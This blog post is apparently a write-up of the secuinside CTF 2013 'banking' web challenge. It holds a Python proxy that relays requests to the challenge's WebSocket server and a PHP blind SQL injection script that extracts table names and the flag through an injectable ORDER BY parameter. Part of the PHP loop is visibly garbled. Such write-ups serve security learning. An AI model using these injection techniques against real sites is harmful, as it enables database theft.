---
title: secuinsideCTF 2013 web banking writeup
author: slipper
layout: post
permalink: /secuinsidectf-2013-web-banking-writeup/
categories:
  - Uncategorized
---
## banking

We found a SQL injection vulnerability in the list page.

When we use the funtion `listing('balance', 'desc')`, we will get the list of users ordered by `balance`.

The sql query seems to be

    select user,balance from user_accounts order by $o $b;
    

$o and $b is the two parameters of function listing();

$o is filtered, but $b is injectable.

For eaxmple, `listing('balance', 'limit 0,1')`; returns only one result.

The following queries returns different result.

    select user,balance from user_accounts order by user, If(2&gt;1, 1, select table_name from information_schema.tables)
    select user,balance from user_accounts order by user, If(2&lt;1, 1, select table_name from information_schema.tables)
    

We wrote a python script to switch protocols from HTTP to WebSocket. (by Flanker)

    from SimpleHTTPServer import SimpleHTTPRequestHandler
    from BaseHTTPServer import BaseHTTPRequestHandler
    from BaseHTTPServer import HTTPServer
    from urlparse import urlparse, parse_qs
    import SocketServer
    from websocket import create_connection
    import json
    
    class MyHTTPRequestHandler(BaseHTTPRequestHandler):
    
        def do_GET(self):
            enc = &#039;utf-8&#039;
            self.send_response(200)
            self.send_header(&quot;Content-type&quot;, &quot;text/html;charset%s&quot; % enc)
            self.end_headers()
            url = self.path
            d = parse_qs(urlparse(url).query)
            print d
            cmd = &quot;list_init&quot;
            if &quot;cmd&quot; in d:
                cmd = d[&quot;cmd&quot;][0]
            o = None
            if &quot;o&quot; in d:
                o = d[&quot;o&quot;][0]
            b = None
            if &quot;b&quot; in d:
                b = d[&quot;b&quot;][0]
            print o, b
            if o is not None and b is not None:
                result = json.loads(self.ws_fetch(cmd, o, b))
                users = json.loads(result[&quot;m&quot;])
                self.wfile.write(len(users))
    ##            for user in users:
    ##                self.wfile.write(&quot;<tr>\n")
    ##                self.wfile.write(("<th>%s</th>\n" % user["user"]).encode("utf-8"))
    ##                self.wfile.write(("<th>%s</th>\n" % user["balance"]).encode("utf-8"))
    ##                self.wfile.write("</tr>")
    
    ##            self.wfile.write("</table>")
    
        def ws_fetch(self, cmd, o, b):
            s = json.dumps({"cmd": cmd, "o": o,"b":b})
            print s
            fetched = False
            while not fetched:
                try:
                    ws = create_connection("ws://1.234.27.139:38090/banking")
                    ws.send(s)
                    ret = ws.recv()
                    fetched = True
                    return ret
                except Exception as e:
                    print "err"
                    print e
            return None
    
        def do_POST(self):
            pass
    
        def do_HEAD(self):
            pass
    
    
    if __name__ == '__main__':
        port = 8080
    
        handler = SimpleHTTPRequestHandler
    
        # httpd = SocketServer.TCPServer(("", port ), handler )
        httpd = HTTPServer(('', port), MyHTTPRequestHandler)
    
        print "Server is running at port", port
        httpd.serve_forever()
    

Later we wrote a php script to do blind injection.

    &lt;?php
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
    
        function check($url)
        {
            global $ch;
            curl_setopt($ch, CURLOPT_URL, $url);
            echo &quot;$url\n&quot;;
            $res = curl_exec($ch);
            echo &quot;$res\n&quot;;
            return $res;
        }
    
        function guess($column, $clause = &quot;from information_schema.tables limit 0,1&quot;, $length = 3)
        {
            $ret = &quot;&quot;;
            $clause = urlencode($clause);
            for ($i = 1; $i 1;
                    $url = "http://127.0.0.1:8080/?o=user&amp;b=,If((select%20ascii(substring($column,$i,1))%20$clause)&gt;=$mid,1,(select%20table_name%20from%20information_schema.tables))%20limit%200,1";
                    if (check($url)) $l = $mid+1;
                    else $r = $mid - 1;
                    echo "$l, $r\n";
                }
                $ret .= chr($r);
                echo "$ret\n";
            }
            return $ret;
        }
    
        //echo guess("length(version())");
        //echo guess("version()", 23);
        //echo guess("length(table_name)", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 0,1");  // 13
        //echo guess("table_name", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 0,1", 13);  //user_accounts
        //echo guess("length(table_name)", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 1,1");  // 8
        //echo guess("table_name", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 1,1", 8);   // flag_tbl
        //echo guess("length(table_schema)", "from information_schema.tables where table_name=0x666c61675f74626c limit 0,1");   // 7
        //echo guess("table_schema", "from information_schema.tables where table_name=0x666c61675f74626c limit 0,1", 7);    // flag_db
        //echo guess("length(column_name)", "from information_schema.columns where table_name=0x666c61675f74626c limit 0,1");   // 4 flag
        //echo guess("length(flag)", "from flag_db.flag_tbl limit 0,1");    // 21
        //echo guess("flag", "from flag_db.flag_tbl limit 0,1", 21);    // TheG0d0fGrabs_M4dL1F3
    ?&gt;
    

The Flag is `TheG0d0fGrabs_M4dL1F3` .